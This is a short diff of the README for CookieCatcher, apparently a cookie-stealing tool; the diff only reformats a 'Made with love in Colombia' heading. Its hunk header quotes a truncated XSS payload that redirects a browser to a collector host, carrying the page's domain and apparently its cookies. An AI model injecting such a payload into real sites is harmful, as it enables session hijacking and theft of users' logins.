@@ -37,7 +37,7 @@ document.location.href="http://cookieCatcher/session/"+document.domain+"/"+docum
 ```
 You can see the file: example.html
 
-#### Made with love in Colombia.
+### Made with :heart: in Colombia.
 # License:
 
 CookieCatcher is licensed under the GPLv3: http://www.gnu.org/licenses/gpl-3.0.html. 
